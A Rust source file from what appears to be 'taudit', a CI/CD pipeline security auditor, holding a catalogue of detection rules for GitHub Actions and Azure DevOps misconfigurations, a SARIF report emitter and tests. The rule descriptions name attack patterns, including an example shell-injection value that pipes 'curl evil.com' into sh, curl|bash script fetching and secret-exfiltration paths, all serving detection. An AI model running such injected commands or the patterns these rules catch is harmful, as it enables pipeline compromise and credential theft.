use serde::Serialize;
use taudit_core::custom_rules::CustomRule;
use taudit_core::error::TauditError;
use taudit_core::finding::{
    compute_fingerprint, Finding, FindingCategory, FindingSource, Severity,
};
use taudit_core::graph::AuthorityGraph;
use taudit_core::ports::ReportSink;

const SARIF_SCHEMA: &str = "https://schemastore.azurewebsites.net/schemas/json/sarif-2.1.0.json";
const SARIF_VERSION: &str = "2.1.0";
const TOOL_NAME: &str = "taudit";
const TOOL_URI: &str = "https://github.com/0ryant/taudit";
const RULES_BASE_URI: &str = "https://github.com/0ryant/taudit/blob/main/docs/rules";

// ── Static rule catalogue ───────────────────────────────

pub struct RuleDef {
    pub id: &'static str,
    pub name: &'static str,
    pub short_description: &'static str,
    pub full_description: &'static str,
    pub default_level: &'static str,
    pub security_severity: &'static str,
    pub tags: &'static [&'static str],
}

/// Public accessor for the static rule catalogue. Used by `taudit explain`
/// and any other consumer that needs to enumerate the built-in rules.
pub fn all_rules() -> &'static [RuleDef] {
    RULE_DEFS
}

pub const RULE_DEFS: &[RuleDef] = &[
    RuleDef {
        id: "authority_propagation",
        name: "AuthorityPropagation",
        short_description: "A secret or identity propagates to a step in a lower trust zone.",
        full_description:
            "A secret or identity propagates to a step in a lower trust zone, allowing \
             privileged credentials to be observed or exfiltrated by untrusted code.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "over_privileged_identity",
        name: "OverPrivilegedIdentity",
        short_description:
            "A GITHUB_TOKEN or service identity has broader permissions than needed.",
        full_description:
            "A GITHUB_TOKEN or service identity has broader permissions than needed for the \
             work the workflow actually performs, expanding the blast radius if the token is \
             misused or leaked.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "unpinned_action",
        name: "UnpinnedAction",
        short_description:
            "A third-party action is referenced by mutable tag instead of SHA digest.",
        full_description:
            "A third-party action is referenced by a mutable tag or branch instead of an \
             immutable SHA digest. The action's code can change under the workflow without \
             any local change, enabling supply-chain attacks.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "untrusted_with_authority",
        name: "UntrustedWithAuthority",
        short_description:
            "An untrusted or unpinned step has direct access to a secret or identity.",
        full_description:
            "An untrusted or unpinned step has direct access to a secret or identity. \
             Compromise of that step yields immediate compromise of the associated authority. \
             \n\n\
             On ADO, System.AccessToken is injected into every task by the platform — this \
             is structural exposure, not a misconfiguration. Findings against System.AccessToken \
             are emitted at Info severity to distinguish them from actionable Critical findings \
             against explicit secrets or service connections. To reduce structural exposure, \
             set `env.SYSTEM_ACCESSTOKEN` only on steps that require it, or restrict the \
             token scope via pipeline-level `security:` settings.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "artifact_boundary_crossing",
        name: "ArtifactBoundaryCrossing",
        short_description:
            "An artifact produced by a privileged step is consumed across a trust boundary.",
        full_description:
            "An artifact produced by a privileged step is consumed across a trust boundary \
             without attestation or verification, allowing downstream stages to execute \
             content originating from a higher-trust context without provenance checks.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "floating_image",
        name: "FloatingImage",
        short_description: "A container image is referenced without a digest pin.",
        full_description:
            "A container image is referenced by tag (e.g. :latest) rather than an immutable \
             digest. The image contents may change between runs without any local change, \
             breaking reproducibility and enabling supply-chain attacks.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "long_lived_credential",
        name: "LongLivedCredential",
        short_description:
            "A secret name matches static credential patterns (API keys, passwords, tokens).",
        full_description:
            "A secret referenced by the workflow matches patterns indicating a long-lived \
             static credential (API key, password, personal access token). Long-lived \
             credentials should be replaced with short-lived OIDC-issued tokens where possible.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials"],
    },
    RuleDef {
        id: "persisted_credential",
        name: "PersistedCredential",
        short_description: "Checkout step persists repository credentials to disk",
        full_description:
            "A checkout step with persistCredentials:true writes the repository token to \
             .git/config on disk, where it persists beyond the lifetime of the step and may \
             be read by subsequent steps or exfiltrated.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "trigger_context_mismatch",
        name: "TriggerContextMismatch",
        short_description: "Privileged workflow triggered by untrusted pull request context",
        full_description:
            "A workflow triggered by pull_request_target or an ADO pr trigger runs with \
             write permissions in the base repository context while potentially executing \
             untrusted code from a fork, creating a privilege escalation path.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "cross_workflow_authority_chain",
        name: "CrossWorkflowAuthorityChain",
        short_description: "Authority-bearing step delegates to external or untrusted workflow",
        full_description:
            "A step holding secrets or elevated identity permissions delegates execution to \
             a reusable workflow or template hosted in an external or untrusted repository, \
             allowing that external code to inherit the authority.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "authority_cycle",
        name: "AuthorityCycle",
        short_description: "Workflow delegation graph contains a cycle",
        full_description:
            "The workflow delegation graph contains a cycle — a workflow calls itself or \
             another workflow that eventually calls back, creating unbounded privilege \
             escalation paths and potential infinite execution.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "configuration"],
    },
    RuleDef {
        id: "uplift_without_attestation",
        name: "UpliftWithoutAttestation",
        short_description: "OIDC-privileged build does not produce a signed attestation",
        full_description:
            "A step with access to an OIDC identity produces artifacts without generating a \
             cryptographic attestation. Downstream consumers cannot verify provenance or \
             integrity of these artifacts.",
        default_level: "note",
        security_severity: "0.1",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "self_mutating_pipeline",
        name: "SelfMutatingPipeline",
        short_description:
            "Step writes to GITHUB_ENV or GITHUB_PATH, mutating the pipeline environment",
        full_description: "A step appends to GITHUB_ENV or GITHUB_PATH, injecting values into the \
             environment or PATH for all subsequent steps. An untrusted or compromised step \
             could use this to escalate privileges or hijack later execution.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "injection"],
    },
    RuleDef {
        id: "variable_group_in_pr_job",
        name: "VariableGroupInPrJob",
        short_description: "PR-triggered job accesses ADO variable group secrets",
        full_description: "A PR-triggered pipeline job has access to variable group secrets. PR \
             pipelines run in the context of untrusted contributor code — variable group \
             secrets crossing this boundary may be exfiltrated via log output, environment \
             variables, or network calls.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "self_hosted_pool_pr_hijack",
        name: "SelfHostedPoolPrHijack",
        short_description: "PR pipeline uses self-hosted pool with repository checkout",
        full_description: "A PR-triggered pipeline runs on a self-hosted agent and checks out the \
             repository. An attacker can inject malicious git hooks via the PR that persist \
             on the shared runner, executing with the pipeline's full authority on \
             subsequent runs.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "injection"],
    },
    RuleDef {
        id: "service_connection_scope_mismatch",
        name: "ServiceConnectionScopeMismatch",
        short_description: "Broad-scope service connection accessible from PR-triggered job",
        full_description:
            "A PR-triggered pipeline job has access to an ADO service connection with \
             broad or unknown scope and no OIDC federation. The static credential may have \
             subscription-wide Azure RBAC permissions, enabling lateral movement into the \
             Azure tenant from untrusted PR code.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "privilege-escalation"],
    },
    RuleDef {
        id: "template_extends_unpinned_branch",
        name: "TemplateExtendsUnpinnedBranch",
        short_description:
            "ADO pipeline pulls a template repository pinned to a mutable branch or default branch.",
        full_description:
            "An Azure DevOps pipeline declares a `resources.repositories` entry that resolves to a \
             mutable target — either no `ref:` field at all (defaults to the repo's default branch) \
             or `refs/heads/<branch>` with a normal branch name. The pipeline references the alias \
             via `extends:`, `template: x@<alias>`, or `checkout: <alias>`. Whoever owns that branch \
             can inject steps into every consuming pipeline at the next run — the ADO equivalent of \
             an unpinned GitHub Action. Combined with self-hosted pool reuse this is full pipeline \
             RCE. Pin to `refs/tags/<x>` or a 40-char commit SHA.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain"],
    },
    RuleDef {
        id: "template_repo_ref_is_feature_branch",
        name: "TemplateRepoRefIsFeatureBranch",
        short_description:
            "ADO pipeline pins a template repository to a developer feature branch.",
        full_description:
            "An Azure DevOps pipeline's `resources.repositories[].ref` resolves to a feature-class \
             branch — anything outside the platform-blessed set (`main`, `master`, `release/*`, \
             `hotfix/*`). Feature branches typically have weaker push protection than the trunk: any \
             developer with write access to that branch can push pipeline YAML that runs with the \
             consumer pipeline's authority — service connections, variable groups, OIDC federations, \
             `System.AccessToken`. This is strictly worse than pinning to `main`, because main \
             usually has branch protection (required reviewers, build validation) that a feature \
             branch lacks. Co-fires with `template_extends_unpinned_branch`, which describes the \
             same entry from the abstract \"not pinned\" angle. Pin to `refs/tags/<x>` or a 40-char \
             commit SHA.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "azure-devops"],
    },
    RuleDef {
        id: "vm_remote_exec_via_pipeline_secret",
        name: "VmRemoteExecViaPipelineSecret",
        short_description:
            "Pipeline step uses Azure VM remote-exec primitive with secret or SAS in the command line",
        full_description:
            "A pipeline step invokes Set-AzVMExtension/CustomScriptExtension, \
             Invoke-AzVMRunCommand, az vm run-command, or az vm extension set, \
             where the executed command line is constructed from a pipeline secret or \
             a freshly-minted SAS token. This is a pipeline-to-VM lateral movement \
             primitive — every pipeline run can RCE every VM in scope, and the \
             credential embedded in the command line is logged in plaintext on the VM \
             (CustomScriptExtension status JSON, Windows event log, /var/log) and in \
             the ARM extension status that anyone with reader on the resource can pull.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "lateral-movement"],
    },
    RuleDef {
        id: "short_lived_sas_in_command_line",
        name: "ShortLivedSasInCommandLine",
        short_description:
            "SAS token minted in-pipeline is passed as a command-line argument",
        full_description:
            "A SAS token minted in-pipeline (New-AzStorage*SASToken or \
             az storage * generate-sas) is interpolated into commandToExecute, \
             scriptArguments, --arguments, -ArgumentList, or otherwise placed on \
             the process command line instead of being passed via env var or stdin. \
             Even short-lived SAS tokens in argv hit Linux /proc/*/cmdline, Windows \
             ETW process-create events, and ARM extension status — logged for the \
             SAS lifetime, accessible to any local process with the right privileges \
             and any reader on the resource.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "credentials"],
    },
    RuleDef {
        id: "checkout_self_pr_exposure",
        name: "CheckoutSelfPrExposure",
        short_description: "PR-triggered pipeline checks out attacker-controlled repository code",
        full_description:
            "A PR-triggered pipeline job (pull_request_target or ADO pr: trigger) performs \
             a checkout of the repository. Attacker-controlled code from a forked PR lands on \
             the runner's workspace and is readable by all subsequent steps. Any step that \
             reads workspace files — scripts, configs, test fixtures — is a potential \
             exfiltration or injection vector. This is distinct from trigger_context_mismatch \
             which fires on authority access; this rule fires whenever code from an untrusted \
             source lands on a privileged runner, regardless of explicit secret access.",
        default_level: "warning",
        security_severity: "7.0",
        tags: &["security", "supply-chain", "pull-request"],
    },
    RuleDef {
        id: "secret_to_inline_script_env_export",
        name: "SecretToInlineScriptEnvExport",
        short_description: "Pipeline secret assigned to a shell variable inside an inline script",
        full_description: "An inline script (`script:`, `Bash@3.inputs.script`, \
             `PowerShell@2.inputs.script`, `AzureCLI@2.inputs.inlineScript`, …) assigns a \
             pipeline `$(SECRET)` value to a shell variable (`export FOO=$(SECRET)`, \
             `$X = \"$(SECRET)\"`). ADO masks `$(SECRET)` as it appears in log output, but \
             masking is applied to the rendered command string before the shell runs. Once \
             the value is bound to a shell variable any transcript (`Start-Transcript`, \
             `bash -x`, `terraform TF_LOG=DEBUG`, `az --debug`, error stack traces) prints \
             the cleartext credential — a historical breach vector for ADO-hosted Terraform \
             and Azure CLI pipelines.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "secret_materialised_to_workspace_file",
        name: "SecretMaterialisedToWorkspaceFile",
        short_description: "Pipeline secret written to a file under the agent workspace",
        full_description: "An inline script writes a pipeline `$(SECRET)` value to a file under \
             `$(System.DefaultWorkingDirectory)`, `$(Build.SourcesDirectory)`, or with a \
             credential-bearing extension (`.tfvars`, `.env`, `.hcl`, `.pfx`, `.key`, `.pem`, \
             `.kubeconfig`, …). The file persists for the rest of the job, is readable by \
             every subsequent step, and may be uploaded by a later `PublishPipelineArtifact` \
             task. Use the `secureFile` task or stream the secret over stdin / an env var \
             to the consuming tool instead.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "keyvault_secret_to_plaintext",
        name: "KeyVaultSecretToPlaintext",
        short_description: "Inline PowerShell pulls a Key Vault secret as plaintext (-AsPlainText)",
        full_description:
            "An inline PowerShell or AzurePowerShell step calls `Get-AzKeyVaultSecret \
             -AsPlainText`, `ConvertFrom-SecureString -AsPlainText`, or the older \
             `(Get-AzKeyVaultSecret …).SecretValueText` pattern, landing the secret in a \
             non-`SecureString` variable. The value is fetched directly from Key Vault — it \
             never traverses the ADO variable-group boundary, so pipeline log masking does \
             not apply. Verbose `Az` / PowerShell logging (`Set-PSDebug -Trace`, \
             `$VerbosePreference = \"Continue\"`) and any error stack trace will then print \
             the cleartext credential. Keep the secret as a `SecureString` and only convert \
             to plaintext at the exact moment of consumption.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "terraform_auto_approve_in_prod",
        name: "TerraformAutoApproveInProd",
        short_description:
            "`terraform apply -auto-approve` against a production service connection without an environment gate",
        full_description:
            "An ADO step runs `terraform apply -auto-approve` (either via an inline script \
             or via TerraformCLI/TerraformTask with `command: apply` and commandOptions \
             containing `auto-approve`) against a service connection whose name matches \
             production patterns (`prod`, `production`, `prd`), and the enclosing job has \
             no `environment:` binding. The auto-approve flag bypasses the only ADO-side \
             change-control on infrastructure rewrites; combined with a shared agent pool, \
             any committer can rewrite production.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "configuration", "azure-devops"],
    },
    RuleDef {
        id: "add_spn_with_inline_script",
        name: "AddSpnWithInlineScript",
        short_description:
            "`AzureCLI` task with addSpnToEnvironment:true plus an inline script — federated token can be laundered",
        full_description:
            "An `AzureCLI@2` (or `AzurePowerShell`) task runs an inline script with \
             `addSpnToEnvironment: true`, which exposes the federated SPN material \
             (`$env:idToken`, `$env:servicePrincipalKey`, `$env:servicePrincipalId`, \
             `$env:tenantId`) as environment variables. An inline script can write that \
             material to a normal pipeline variable via `##vso[task.setvariable]`, after \
             which the OIDC token is inherited un-masked by every downstream task.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "credentials", "azure-devops"],
    },
    RuleDef {
        id: "parameter_interpolation_into_shell",
        name: "ParameterInterpolationIntoShell",
        short_description:
            "Free-form string parameter interpolated into an inline script — shell injection vector",
        full_description:
            "A pipeline-level `parameters:` entry of `type: string` with no `values:` \
             allowlist is interpolated via `${{ parameters.<name> }}` directly into an \
             inline shell or PowerShell script body. ADO does not escape parameter values \
             during YAML emission, so anyone with permission to queue the build can inject \
             arbitrary shell commands by passing a malicious value (e.g. \
             `something; curl evil.com | sh`). Constrain inputs with a `values:` allowlist \
             or pass the parameter through the step's `env:` block so the runtime quotes it.",
        default_level: "warning",
        security_severity: "5.0",
        tags: &["security", "injection", "azure-devops"],
    },
    RuleDef {
        id: "runtime_script_fetched_from_floating_url",
        name: "RuntimeScriptFetchedFromFloatingUrl",
        short_description:
            "A `run:` step downloads and executes a script from a mutable URL (curl|bash from a branch ref).",
        full_description:
            "A workflow step pipes a remotely-fetched script directly into a shell \
             interpreter (`curl … | bash`, `wget … | sh`, `bash <(curl …)`, \
             `deno run https://…`) where the URL is not pinned to a tag or commit SHA — \
             typically containing `refs/heads/`, `/main/`, or `/master/`. Whoever can land \
             a commit on the referenced branch (including the upstream maintainers, but \
             also any attacker who compromises the upstream account) executes arbitrary \
             code on the runner with the workflow's full token scope. Pin to a release tag \
             or, better, to a commit SHA, and verify the download against a checksum.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "pr_trigger_with_floating_action_ref",
        name: "PrTriggerWithFloatingActionRef",
        short_description:
            "High-authority PR trigger combined with a non-SHA-pinned action ref — single-PR RCE chain.",
        full_description:
            "The workflow uses a high-authority PR-class trigger (`pull_request_target`, \
             `issue_comment`, or `workflow_run`) that runs in the base repository context \
             with full `GITHUB_TOKEN` write permissions, and at least one step references \
             an action by a mutable ref (`@main`, `@master`, `@v1`) instead of a 40-char \
             commit SHA. Anyone who can push to the referenced action branch executes code \
             with full write access on the target repository — a one-PR exploit chain. \
             Either drop the privileged trigger (use `pull_request` for CI) or pin every \
             action in the workflow to a commit SHA.",
        default_level: "error",
        security_severity: "9.0",
        tags: &["security", "privilege-escalation", "supply-chain", "github-actions"],
    },
    RuleDef {
        id: "untrusted_api_response_to_env_sink",
        name: "UntrustedApiResponseToEnvSink",
        short_description:
            "API response derived from PR metadata is written to $GITHUB_ENV — environment injection vector.",
        full_description:
            "A `workflow_run`-triggered workflow captures output from a GitHub API call \
             (`gh pr view`, `gh api`, `curl api.github.com`) and pipes it into \
             `$GITHUB_ENV`, `$GITHUB_OUTPUT`, or `$GITHUB_PATH` without sanitisation. \
             Because the API response embeds attacker-influenced fields (branch name, PR \
             title, head commit message), a value crafted to contain a newline plus \
             `KEY=value` injects an environment variable into every subsequent step in \
             the same job — including steps that hold the repository write token. \
             Validate with a strict regex before redirecting to the env file, or write \
             only known-numeric fields (PR number, commit timestamp).",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "injection", "github-actions"],
    },
    RuleDef {
        id: "pr_build_pushes_image_with_floating_credentials",
        name: "PrBuildPushesImageWithFloatingCredentials",
        short_description:
            "PR-triggered workflow logs into a container registry via a non-SHA-pinned action.",
        full_description:
            "A `pull_request`-triggered workflow uses a container-registry login action \
             (`docker/login-action`, `aws-actions/amazon-ecr-login`, `azure/docker-login`, \
             `google-github-actions/auth`) pinned to a mutable ref. The login action \
             receives either an OIDC token (when `id-token: write` is granted) or a \
             long-lived registry credential. A compromise of the action's branch lets an \
             attacker exfiltrate that credential, and any subsequent `docker push` \
             publishes a PR-controlled image to a shared registry — poisoning every \
             downstream consumer. Pin every login action to a commit SHA and gate the \
             push step on `if: github.event.pull_request.head.repo.fork == false`.",
        default_level: "error",
        security_severity: "7.5",
        tags: &["security", "supply-chain", "credentials", "github-actions"],
    },
];

// ── SARIF 2.1.0 schema structs ──────────────────────────

#[derive(Serialize)]
struct SarifLog {
    #[serde(rename = "$schema")]
    schema: &'static str,
    version: &'static str,
    runs: Vec<SarifRun>,
}

#[derive(Serialize)]
struct SarifRun {
    tool: SarifTool,
    results: Vec<SarifResult>,
}

#[derive(Serialize)]
struct SarifTool {
    driver: SarifDriver,
}

#[derive(Serialize)]
struct SarifDriver {
    name: &'static str,
    version: String,
    #[serde(rename = "informationUri")]
    information_uri: &'static str,
    rules: Vec<SarifRule>,
}

#[derive(Serialize)]
struct SarifRule {
    id: String,
    name: String,
    #[serde(rename = "shortDescription")]
    short_description: SarifMessage,
    #[serde(rename = "fullDescription")]
    full_description: SarifMessage,
    #[serde(rename = "defaultConfiguration")]
    default_configuration: SarifDefaultConfiguration,
    #[serde(rename = "helpUri")]
    help_uri: String,
    properties: SarifRuleProperties,
}

#[derive(Serialize)]
struct SarifDefaultConfiguration {
    level: String,
}

#[derive(Serialize)]
struct SarifRuleProperties {
    #[serde(rename = "security-severity")]
    security_severity: String,
    tags: Vec<String>,
}

#[derive(Serialize, Clone)]
struct SarifMessage {
    text: String,
}

#[derive(Serialize)]
struct SarifResult {
    #[serde(rename = "ruleId")]
    rule_id: String,
    level: &'static str,
    message: SarifMessage,
    locations: Vec<SarifLocation>,
    properties: SarifResultProperties,
    #[serde(rename = "partialFingerprints")]
    partial_fingerprints: SarifPartialFingerprints,
}

#[derive(Serialize)]
struct SarifResultProperties {
    #[serde(rename = "security-severity")]
    security_severity: &'static str,
    /// Provenance label distinguishing built-in findings from those emitted
    /// by custom invariant YAML loaded via `--invariants-dir`. SIEMs and
    /// triage tooling should treat any non-`built-in` value as
    /// untrusted-by-default — anyone with write access to the invariants
    /// directory can otherwise emit arbitrarily-worded CRITICAL findings
    /// indistinguishable from authentic ones. Format: literal `built-in`
    /// for shipped rules, `custom:<source-file-path>` for custom invariants.
    #[serde(rename = "taudit-source")]
    taudit_source: String,
}

#[derive(Serialize)]
struct SarifPartialFingerprints {
    #[serde(rename = "primaryLocationLineHash")]
    primary_location_line_hash: String,
}

#[derive(Serialize)]
struct SarifLocation {
    #[serde(rename = "physicalLocation")]
    physical_location: SarifPhysicalLocation,
}

#[derive(Serialize)]
struct SarifPhysicalLocation {
    #[serde(rename = "artifactLocation")]
    artifact_location: SarifArtifactLocation,
}

#[derive(Serialize)]
struct SarifArtifactLocation {
    uri: String,
    #[serde(rename = "uriBaseId")]
    uri_base_id: &'static str,
}

// ── Adapter ─────────────────────────────────────────────

pub struct SarifReportSink;

impl SarifReportSink {
    /// Emit a single SARIF 2.1.0 document aggregating findings from multiple
    /// pipeline files. All results land in one `runs[0]` entry so downstream
    /// consumers (sarif-tools, jq, VS Code) see a valid top-level JSON object.
    pub fn emit_multi<W: std::io::Write>(
        &self,
        w: &mut W,
        items: &[(&AuthorityGraph, &[Finding])],
    ) -> Result<(), TauditError> {
        self.emit_multi_with_custom_rules(w, items, &[])
    }

    /// Like `emit_multi` but also injects entries for custom (user-defined)
    /// rules into the SARIF driver's `rules` array. SARIF requires every
    /// `result.ruleId` to resolve against a `rules[]` entry — without this
    /// step custom rules would surface as "unknown rule" in viewers.
    pub fn emit_multi_with_custom_rules<W: std::io::Write>(
        &self,
        w: &mut W,
        items: &[(&AuthorityGraph, &[Finding])],
        custom_rules: &[CustomRule],
    ) -> Result<(), TauditError> {
        let mut rules = build_rules();
        rules.extend(build_custom_rules(custom_rules));
        let custom_ids: std::collections::HashSet<&str> =
            custom_rules.iter().map(|r| r.id.as_str()).collect();
        let results: Vec<SarifResult> = items
            .iter()
            .flat_map(|(graph, findings)| {
                findings
                    .iter()
                    .map(|f| finding_to_result(f, &graph.source.file, graph, &custom_ids))
            })
            .collect();

        let log = SarifLog {
            schema: SARIF_SCHEMA,
            version: SARIF_VERSION,
            runs: vec![SarifRun {
                tool: SarifTool {
                    driver: SarifDriver {
                        name: TOOL_NAME,
                        version: env!("CARGO_PKG_VERSION").to_string(),
                        information_uri: TOOL_URI,
                        rules,
                    },
                },
                results,
            }],
        };

        serde_json::to_writer_pretty(w, &log)
            .map_err(|e| TauditError::Report(format!("SARIF serialization error: {e}")))?;

        Ok(())
    }
}

impl<W: std::io::Write> ReportSink<W> for SarifReportSink {
    fn emit(
        &self,
        w: &mut W,
        graph: &AuthorityGraph,
        findings: &[Finding],
    ) -> Result<(), TauditError> {
        self.emit_multi(w, &[(graph, findings)])
    }
}

fn build_rules() -> Vec<SarifRule> {
    RULE_DEFS
        .iter()
        .map(|r| SarifRule {
            id: r.id.to_string(),
            name: r.name.to_string(),
            short_description: SarifMessage {
                text: r.short_description.to_string(),
            },
            full_description: SarifMessage {
                text: r.full_description.to_string(),
            },
            default_configuration: SarifDefaultConfiguration {
                level: r.default_level.to_string(),
            },
            help_uri: format!("{RULES_BASE_URI}/{}", r.id),
            properties: SarifRuleProperties {
                security_severity: r.security_severity.to_string(),
                tags: r.tags.iter().map(|t| (*t).to_string()).collect(),
            },
        })
        .collect()
}

fn build_custom_rules(rules: &[CustomRule]) -> Vec<SarifRule> {
    rules
        .iter()
        .map(|r| {
            let level = match r.severity {
                Severity::Critical | Severity::High => "error",
                Severity::Medium => "warning",
                Severity::Low | Severity::Info => "note",
            };
            let security_severity = match r.severity {
                Severity::Critical => "9.0",
                Severity::High => "7.5",
                Severity::Medium => "5.0",
                Severity::Low => "2.0",
                Severity::Info => "0.1",
            };
            let short = if r.description.is_empty() {
                r.name.clone()
            } else {
                r.description.clone()
            };
            SarifRule {
                id: r.id.clone(),
                name: r.name.clone(),
                short_description: SarifMessage {
                    text: short.clone(),
                },
                full_description: SarifMessage { text: short },
                default_configuration: SarifDefaultConfiguration {
                    level: level.to_string(),
                },
                help_uri: format!("{RULES_BASE_URI}/{}", r.id),
                properties: SarifRuleProperties {
                    security_severity: security_severity.to_string(),
                    tags: vec!["security".to_string(), "custom-rule".to_string()],
                },
            }
        })
        .collect()
}

/// Map a `Finding` to a SARIF `result` object. Custom-rule findings carry
/// their rule id in the message as `[<id>] ...`; if `<id>` matches a known
/// custom rule, the SARIF result uses the custom id so it links to the
/// injected `rules[]` entry rather than the built-in category.
fn finding_to_result(
    finding: &Finding,
    source_file: &str,
    graph: &AuthorityGraph,
    custom_ids: &std::collections::HashSet<&str>,
) -> SarifResult {
    let rule_id = extract_custom_rule_id(&finding.message)
        .filter(|id| custom_ids.contains(id.as_str()))
        .unwrap_or_else(|| category_to_rule_id(&finding.category));
    let level = severity_to_level(&finding.severity);
    let security_severity = severity_to_security_severity(&finding.severity);

    let uri = source_file.to_string();

    // Single source of truth for the fingerprint lives in
    // `taudit_core::finding::compute_fingerprint`. Same value also surfaces
    // in the JSON report (`findings[].fingerprint`) and the CloudEvents
    // sink (`tauditfindingfingerprint` extension attribute) so SIEMs can
    // dedup across formats. See `docs/finding-fingerprint.md`.
    let fingerprint = compute_fingerprint(finding, graph);

    let taudit_source = match &finding.source {
        FindingSource::BuiltIn => "built-in".to_string(),
        FindingSource::Custom { source_file } => {
            format!("custom:{}", source_file.display())
        }
    };

    SarifResult {
        rule_id,
        level,
        message: SarifMessage {
            text: finding.message.clone(),
        },
        locations: vec![SarifLocation {
            physical_location: SarifPhysicalLocation {
                artifact_location: SarifArtifactLocation {
                    uri,
                    uri_base_id: "%SRCROOT%",
                },
            },
        }],
        properties: SarifResultProperties {
            security_severity,
            taudit_source,
        },
        partial_fingerprints: SarifPartialFingerprints {
            primary_location_line_hash: fingerprint,
        },
    }
}

/// Pull a custom rule id out of a finding message of the form `[id] rest`.
/// Returns None if the message does not start with a bracketed id.
fn extract_custom_rule_id(message: &str) -> Option<String> {
    if !message.starts_with('[') {
        return None;
    }
    let end = message.find(']')?;
    let id = &message[1..end];
    if id.is_empty() {
        None
    } else {
        Some(id.to_string())
    }
}

fn category_to_rule_id(category: &FindingCategory) -> String {
    // Delegate to serde to stay in sync with the serialized form (snake_case).
    serde_json::to_value(category)
        .ok()
        .and_then(|v| v.as_str().map(str::to_string))
        .unwrap_or_else(|| "unknown".to_string())
}

fn severity_to_level(severity: &Severity) -> &'static str {
    match severity {
        Severity::Critical | Severity::High => "error",
        Severity::Medium => "warning",
        Severity::Low | Severity::Info => "note",
    }
}

fn severity_to_security_severity(severity: &Severity) -> &'static str {
    match severity {
        Severity::Critical => "9.0",
        Severity::High => "7.5",
        Severity::Medium => "5.0",
        Severity::Low => "2.0",
        Severity::Info => "0.1",
    }
}

// ── Tests ────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use taudit_core::finding::{Recommendation, Severity};
    use taudit_core::graph::{AuthorityGraph, PipelineSource};
    use taudit_core::ports::ReportSink;

    fn source() -> PipelineSource {
        PipelineSource {
            file: ".github/workflows/ci.yml".into(),
            repo: None,
            git_ref: None,
            commit_sha: None,
        }
    }

    fn empty_graph() -> AuthorityGraph {
        AuthorityGraph::new(source())
    }

    fn make_finding(severity: Severity, category: FindingCategory, msg: &str) -> Finding {
        Finding {
            severity,
            category,
            path: None,
            nodes_involved: vec![],
            message: msg.to_string(),
            recommendation: Recommendation::Manual {
                action: "review".to_string(),
            },
            source: taudit_core::finding::FindingSource::BuiltIn,
        }
    }

    fn emit_to_string(graph: &AuthorityGraph, findings: &[Finding]) -> serde_json::Value {
        let mut buf = Vec::new();
        SarifReportSink.emit(&mut buf, graph, findings).unwrap();
        serde_json::from_slice(&buf).unwrap()
    }

    #[test]
    fn empty_findings_produces_valid_sarif() {
        let graph = empty_graph();
        let sarif = emit_to_string(&graph, &[]);

        assert_eq!(sarif["version"], "2.1.0");
        assert!(sarif["$schema"].as_str().unwrap().contains("sarif-2.1.0"));
        let results = &sarif["runs"][0]["results"];
        assert_eq!(results.as_array().unwrap().len(), 0);
    }

    #[test]
    fn driver_name_and_rules_present() {
        let graph = empty_graph();
        let sarif = emit_to_string(&graph, &[]);

        let driver = &sarif["runs"][0]["tool"]["driver"];
        assert_eq!(driver["name"], "taudit");

        let rules = driver["rules"].as_array().unwrap();
        assert_eq!(rules.len(), RULE_DEFS.len());

        // Every rule has the required fields
        for rule in rules {
            assert!(rule["id"].is_string());
            assert!(rule["name"].is_string());
            assert!(rule["shortDescription"]["text"].is_string());
            assert!(rule["fullDescription"]["text"].is_string());
            assert!(rule["defaultConfiguration"]["level"].is_string());
            assert!(rule["helpUri"].is_string());
            assert!(rule["properties"]["security-severity"].is_string());
            let tags = rule["properties"]["tags"].as_array().unwrap();
            assert!(
                tags.iter().any(|t| t == "security"),
                "every rule must carry the \"security\" tag"
            );
        }
    }

    #[test]
    fn severity_maps_to_correct_sarif_level() {
        let graph = empty_graph();
        let findings = vec![
            make_finding(
                Severity::Critical,
                FindingCategory::UnpinnedAction,
                "critical",
            ),
            make_finding(
                Severity::High,
                FindingCategory::OverPrivilegedIdentity,
                "high",
            ),
            make_finding(
                Severity::Medium,
                FindingCategory::AuthorityPropagation,
                "medium",
            ),
            make_finding(Severity::Low, FindingCategory::LongLivedCredential, "low"),
            make_finding(Severity::Info, FindingCategory::FloatingImage, "info"),
        ];

